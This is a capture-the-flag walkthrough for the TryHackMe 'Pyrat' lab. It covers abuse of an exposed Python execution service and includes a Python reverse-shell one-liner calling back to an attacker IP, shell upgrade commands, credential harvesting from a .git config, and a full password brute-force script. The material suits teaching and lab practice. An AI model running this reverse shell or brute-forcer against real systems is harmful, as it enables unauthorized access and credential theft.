Scan ports using nmap. There's 8000 and 22 open. Access web by:
nc pyrat.thm 8000
print("hello")

it will execute the python command. Write shell to get shell
So use the payload from revshell.com(fixed):
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.157.149",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
or Upgrade the shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

To make the shell usable:
```
stty raw -echo; fg
```
**stty:** This command changes and prints terminal line settings. It’s used to configure how the terminal interacts with input and output.
raw: This mode disables input processing, making the terminal behave in “raw” mode. In this mode, special characters like Ctrl+C or Ctrl+Z won’t be interpreted by the terminal, and everything typed will go directly to the shell. This helps in making a remote shell behave more like a local interactive shell.

· -**echo:** This disables the terminal’s echo feature, meaning that the characters you type won’t be shown on the screen. When using a remote shell, this is useful to avoid duplicate characters when typing commands.
 **;:** This semicolon allows you to run multiple commands sequentially in a single line.

· **fg:** This command brings a background process to the foreground. Since you used Ctrl+Z to suspend the Netcat shell, fg resumes the shell and allows you to continue interacting with it.

f you see the .git folder in there, you can read the configuration file (which contains the password for the user think) by running:

```
cat /opt/dev/.git/config
```
In a new terminal login to ssh: think@IP_ADDRESS.

 Navigating to .git and checking the repository for any exposed secrets , configuration files, or sensitive code. Use tools like git log to review commit history or git show to examine file contents.

git log



create a script that brute forces admin ssh:
```python
import socket

host = "10.82.132.33"
port = 8000
wordlist = "/usr/share/wordlists/rockyou.txt"

print(f"[*] Starting brute force against {host}:{port}...")

with open(wordlist, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1) # Short timeout to keep it moving
            s.connect((host, port))
            # 1. Initiate admin login
            s.sendall(b"admin\n")
            s.recv(1024) 
            # 2. Send the password
            s.sendall(f"{password}\n".encode())
            # 3. Check for a response
            try:
                response = s.recv(1024).decode().strip()
                # If we actually get a response now, it's interesting!
                if response:
                    print(f"\n[!] ALERT: Password '{password}' got a response: {response}")
                    # Most likely success indicator:
                    if "welcome" in response.lower() or "root" in response.lower() or "shell" in response.lower():
                        print(f"[+++] SUCCESS! Password is: {password}")
                        s.close()
                        break
            except socket.timeout:
                # This is what happens for 99% of wrong passwords (silence)
                pass
            s.close()
        except Exception:
            continue
```
found: abc123
Use it in nc pyrat.thm 8000
admin
abc123
shell
